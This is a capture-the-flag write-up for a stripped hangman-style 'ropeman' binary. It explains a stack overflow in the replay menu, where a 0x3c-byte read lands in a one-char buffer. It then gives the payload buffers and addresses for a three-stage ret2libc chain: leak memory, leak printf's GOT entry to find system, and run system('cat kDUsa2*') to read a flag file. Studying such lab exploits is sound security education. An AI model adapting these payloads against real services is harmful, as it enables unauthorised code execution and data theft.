# Ropeman

## Description

> An interesting ropeman/hangman game binary program. Password-protected note
> storage service in C

This ropeman game has been created by *SecDawgs* team. It's a stripped binary
with ASLR enabled and the stack not executable.

It provides some basic functions such as:
* Account creation and login
* Management of a user's status and a score
* A scoreboard
* The ropeman game

To be able to play, you must sign in with a valid login. You can then choose
between 8 categories of words:
1. animals 
2. fruits 
3. instruments 
4. passwords 
5. programming-languages 
6. science 
7. sports 
8. stack-exchange-sites 

For each game, you can fail upto 6 times otherwise your man would be hung. All
possible characters are letters and space. If you win, your score will
increase based on the number of remaining round.

In addition to a score, each user can have a status of at most 128 characters.
This status is defined by the user and is stored with the password and the
score in a file named after the username, in the `rw` directory. It contains
the data formatted as such:
```
score|password|status
```


### Flag

Flag Description:

> Flags are identified by the note name.The flags are the status field in a txt
> file for a registered user

The *flag_id* is the username used to store the *flag* while the later is
stored as the user's status.


## Vulnerabilities

A [radare2 script file][r2] is provided to ease the understanding of the
stripped binary.

When we analyse the binary, we can discover a function
`fcn.print_memory_info` which prints very intersting memory locations,
including:
* An address in the stack
* An address in the heap
* An address in BSS
* An address in .text

Such information may be very useful to bypass the ASLR. It also indicates that
a buffer overflow may be present in the binary because no piece of code is
using it.

If we take a close look, one overflow is actually possible in `fcn.replay_menu`
which manage the menu printed after a game has been played.
```asm
/ (fcn) fcn.replay_menu 166
|           ; var int local_ch     @ ebp-0xc
|           ; var int local_10h    @ ebp-0x10
|           ; var int local_14h    @ ebp-0x14
|           ; var int local_18h    @ ebp-0x18
|           ; var int local_1ch    @ ebp-0x1c
|           ; var int choice_char  @ ebp-0x20
|           ; CALL XREF from 0x08049f8c (fcn.replay_menu)
|           0x08049b2a      55             push ebp
|           0x08049b2b      89e5           mov ebp, esp
|           0x08049b2d      83ec38         sub esp, 0x38
|           0x08049b30      c745e0000000.  mov dword [ebp - choice_char], 0
|           0x08049b37      c745e4000000.  mov dword [ebp - local_1ch], 0
|           0x08049b3e      c745e8000000.  mov dword [ebp - local_18h], 0
|           0x08049b45      c745ec000000.  mov dword [ebp - local_14h], 0
|           0x08049b4c      c745f0000000.  mov dword [ebp - local_10h], 0
|           0x08049b53      c745f4a18601.  mov dword [ebp - local_ch], 0x186a1
|       ,=< 0x08049b5a      eb66           jmp 0x8049bc2
|       |   ; JMP XREF from 0x08049bc9 (fcn.replay_menu)
|      .--> 0x08049b5c      e84bf1ffff     call fcn.print_replay_menu
|      ||   ; DATA XREF from 0x080530a4 (fcn.replay_menu)
|      ||   0x08049b61      a1a4300508     mov eax, dword [obj.stdin]  ; [0x80530a4:4]=0x62552820 LEA obj.stdin ; " (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3" @ 0x80530a4
|      ||   0x08049b66      89442408       mov dword [esp + 8], eax
|      ||   0x08049b6a      c74424043c00.  mov dword [esp + 4], 0x3c   ; [0x3c:4]=0x8048034 section_end.ehdr ; '<'
|      ||   0x08049b72      8d45e0         lea eax, [ebp - choice_char]
|      ||   0x08049b75      890424         mov dword [esp], eax
|      ||   0x08049b78      e846faffff     call fcn.read_string
|      ||   0x08049b7d      0fb645e0       movzx eax, byte [ebp - choice_char]
|      ||   0x08049b81      0fbec0         movsx eax, al
|      ||   0x08049b84      83e851         sub eax, 0x51
|      ||   0x08049b87      83f827         cmp eax, 0x27               ; '''
|     ,===< 0x08049b8a      7729           ja 0x8049bb5
|     |||   0x08049b8c      8b04853cf104.  mov eax, dword [eax*4 + 0x804f13c] ; [0x804f13c:4]=0x8049b9e
|     |||   0x08049b93      ffe0           jmp eax
|     |||   0x08049b95      c745f4a68601.  mov dword [ebp - local_ch], 0x186a6
|    ,====< 0x08049b9c      eb24           jmp 0x8049bc2
|    ||||   0x08049b9e      c745f4a58601.  mov dword [ebp - local_ch], 0x186a5
|   ,=====< 0x08049ba5      eb1b           jmp 0x8049bc2
|   |||||   0x08049ba7      e8e9f1ffff     call fcn.print_score_board
|   |||||   0x08049bac      c745f4a28601.  mov dword [ebp - local_ch], 0x186a2
|  ,======< 0x08049bb3      eb0d           jmp 0x8049bc2
|  ||||||   ; JMP XREF from 0x08049b8a (fcn.replay_menu)
|  |||`---> 0x08049bb5      c704240cf104.  mov dword [esp], str.Please_enter_a_valid_command__S___Q___X__n: ; [0x804f10c:4]=0x61656c50 LEA str.Please_enter_a_valid_command__S___Q___X__n: ; "Please enter a valid command!(S | Q | X).:  " @ 0x804f10c
|  ||| ||   0x08049bbc      e883efffff     call fcn.print
|  ||| ||   0x08049bc1      90             nop
|  ```--`-> 0x08049bc2      817df4a18601.  cmp dword [ebp - local_ch], 0x186a1 ; [0x186a1:4]=-1
|      `==< 0x08049bc9      7491           je 0x8049b5c
|           0x08049bcb      8b45f4         mov eax, dword [ebp - local_ch]
|           0x08049bce      c9             leave
\           0x08049bcf      c3             ret
```

Actually, instead of calling `fcn.read_char` to read one character at
`0x08049b78`, it reads a whole string, until a newline or `0x3c` characters
have been read. However, the buffer where the result is stored, `choice_char`
is only a `char` variable, located at `ebp - 0x20`:
```asm
call fcn.print_replay_menu
mov eax, dword [obj.stdin]
mov dword [esp + 8], eax
mov dword [esp + 4], 0x3c
lea eax, [ebp - choice_char]
mov dword [esp], eax
call fcn.read_string
```

Because `0x3c > 0x20`, we can control the flow of execution. And with the help
from `fcn.print_memory_info`, we can have enough information to exploit the 
binary.


## Proof of Concept

The scenario could be quite simple:
1. leak memory information
2. send a shellcode to retrieve the flag

However, the stack isn't executable. This means we should find a way to execute
a command. One way to do it is to leak the position of `system` in the *libc*.
It can be done by leaking the position of an other *libc* function, like
`printf` and applying the constant offset inside the library code:

```bash
gdb$ b *0x08049fa2
Breakpoint 1 at 0x8049fa2
gdb$ r
Breakpoint 1, 0x08049fa2 in ?? ()
gdb$ p system
$1 = {<text variable, no debug info>} 0xf7e5f190 <system>
gdb$ p printf
$2 = {<text variable, no debug info>} 0xf7e6c280 <printf>
gdb$ p $2-$1
$3 = 0xd0f0
```
The offset between the functions `printf` and `system` in the *libc* library
of the vulnerable VM is then `0xd0f0`.

The attack will thus be the following:
1. leak memory information
2. leak `printf` location from the relocation table
3. call `system` to get our flag

### Leak stack location

We saw that a function will do it for us. However, we must keep the same
connection for all 3 phases. That means we can't just redirect the flow to
`fcn.print_memory_info`. We also need to redirect it back to the normal flow
of the program, without any segmentation faults.

We can redirect to the beginning of the function `fcn.replay_menu` to be able
to exploit the vulnerability once again. The buffer to send for this phase is:
```python
"A" * 0x24 + pack('<II', 0x08048ae4, 0x08049b2a)
```

`0x08048ae4` is the address of `fcn.print_memory_info` and `0x08049b2a` is the
address of `fcn.replay_menu`.

### Leak printf location
The relocation entry of `printf` is located at `0x08053008`:
```bash
$ readelf -r ropeman | grep ' printf'
08053008  00000307 R_386_JUMP_SLOT   00000000   printf
```

So, to leak the relocation entry, we can use `printf` itself. We can use the
format string `Error : Failed to open input directory - %s` at `0x080513c8`.

The buffer for this phase is thus:
```python
"A" * 0x24 + pack('<IIII', 0x08048800, 0x08049b2a, 0x080513c8, 0x08053008)
```

`0x08048800` is the address of `printf` PLT entry.

### Call system
This part may seems easy, but there are some aspects to consider.

First, the command to run must be located in the stack **after** the address
of `system` and its arguments. This is a problem because of the limitation of
the length of the buffer.

Because `fcn.read_string` will only read at most `0x3c` characters from
stdin and due to the position of `choice_char` in the stack frame (at
`ebp - 0x20`), we can't store a complete *cat* command. However, we can use
a wildcard to complete the filename for us. The command will thus looks like
that:
```bash
cat kDUsa2*
```
6 characters is usually enough to get only one file.

### All in one

The script [poc.py][poc] sends the first 2 buffers to extract both an address
in the stack and the address of `printf`. From the `printf` address, the one of
`system` is computed. From the stack address, we can compute the address of the
*cat* command string, injected by the third overflow.

We finally get the *flag* file dumped and we only have to extract the flag from
the status field.

```bash
$ ./poc.py 192.168.56.101 20129 kDUsa2IORv7TbZDh3jyx
Stack address: 0xffdff93c
Printf address: 0xf7636280
exec address: 0xf7629190
FLGsb2uIF1Tvc1OG
```


[poc]: poc.py
[r2]: radare2/ropeman
